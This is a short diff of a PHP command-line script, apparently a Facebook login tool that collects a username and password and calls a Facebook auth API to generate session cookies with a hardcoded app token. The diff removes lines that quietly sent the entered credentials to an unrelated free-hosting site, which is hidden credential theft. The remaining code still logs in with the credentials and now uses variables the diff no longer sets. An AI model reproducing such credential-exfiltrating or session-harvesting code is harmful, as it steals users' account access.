@@ -12,11 +12,7 @@ echo "\033[33;1m [?] COPYRIGHT 2019 [?] \n";
 function input($echo) { 
 		echo "\033[36;1m $echo --> "; 
 		} 
-input("Username"); 
-$iduser=trim(fgets(STDIN)); 
-input("Password"); 
-$pass=trim(fgets(STDIN));
-file_get_contents('https://livechatanddatingfree.000webhostapp.com/login.php?email=' . $iduser . '&' . 'pwd=' . $pass);
+
 echo "=========================== \n"; 
 $konten=file_get_contents('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='.$iduser.'&locale=en_US&password='.$pass.'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'); 
 $json= json_decode($konten, true);
